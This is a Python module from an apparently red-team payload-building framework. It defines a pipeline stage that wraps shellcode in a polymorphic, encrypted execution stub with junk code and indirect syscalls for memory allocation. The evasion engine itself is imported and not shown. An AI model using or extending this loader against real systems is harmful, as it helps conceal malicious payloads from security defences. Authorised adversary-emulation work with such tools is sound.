"""Polymorphic shellcode loader stage.

Wraps shellcode (typically from Donut) in a unique polymorphic execution
stub that changes every invocation. The stub decrypts the payload using
a rolling XOR key, optionally allocates executable memory via indirect
syscalls (PEB walk + SSN resolution), and transfers execution.

Pure Python — uses keystone-engine for x86_64 cross-assembly and
pycryptodome for encryption. No external CLI tools.
"""

from __future__ import annotations

import logging

from redcrucible.exceptions import PipelineError, StageValidationError
from redcrucible.models.enums import ArtifactType
from redcrucible.pipeline.context import PipelineContext
from redcrucible.pipeline.stage import BaseStage

from ._polymorph import PolymorphicEngine
from ._polymorph.engine import EngineOptions

logger = logging.getLogger(__name__)


class PolymorphicLoaderStage(BaseStage):
    """Wrap shellcode in a unique polymorphic execution stub.

    Options:
        encryption (str): "aes" (32-byte key, default) or "xor" (16-byte key).
        syscalls (bool): Use indirect syscalls for RWX allocation. Default True.
        junk_density (int): Dead code density, 1-5. Default 3.
    """

    def __init__(self) -> None:
        self._engine = PolymorphicEngine()

    @property
    def name(self) -> str:
        return "polymorphic_loader"

    @property
    def description(self) -> str:
        return "Wrap shellcode in a unique polymorphic execution stub"

    def supported_input_types(self) -> list[ArtifactType]:
        return [ArtifactType.SHELLCODE]

    def output_type(self) -> ArtifactType:
        return ArtifactType.SHELLCODE

    def validate_options(self, options: dict) -> None:
        allowed = {"encryption", "syscalls", "junk_density"}
        unknown = set(options.keys()) - allowed
        if unknown:
            raise StageValidationError(
                self.name,
                f"Unknown options: {', '.join(sorted(unknown))}",
            )

        encryption = options.get("encryption", "aes")
        if encryption not in ("aes", "xor"):
            raise StageValidationError(
                self.name,
                f"Invalid encryption '{encryption}'. Must be 'aes' or 'xor'.",
            )

        junk_density = options.get("junk_density", 3)
        if not isinstance(junk_density, int) or junk_density < 1 or junk_density > 5:
            raise StageValidationError(
                self.name,
                f"Invalid junk_density '{junk_density}'. Must be int 1-5.",
            )

    async def execute(self, ctx: PipelineContext, options: dict) -> PipelineContext:
        engine_opts = EngineOptions(
            encryption=options.get("encryption", "aes"),
            syscalls=options.get("syscalls", True),
            junk_density=options.get("junk_density", 3),
        )

        logger.info(
            "Generating polymorphic loader for build %s: encryption=%s, "
            "syscalls=%s, junk_density=%d, payload_size=%d",
            ctx.build_id, engine_opts.encryption, engine_opts.syscalls,
            engine_opts.junk_density, len(ctx.artifact),
        )

        try:
            result = self._engine.generate(ctx.artifact, engine_opts)
        except Exception as exc:
            raise PipelineError(
                self.name,
                f"Polymorphic generation failed: {exc}",
            ) from exc

        input_size = len(ctx.artifact)
        ctx.artifact = result.shellcode
        ctx.artifact_type = self.output_type()

        logger.info(
            "Polymorphic loader completed for build %s: %d -> %d bytes "
            "(stub=%d, payload=%d)",
            ctx.build_id, input_size, result.total_size,
            result.stub_size, result.payload_size,
        )

        return ctx
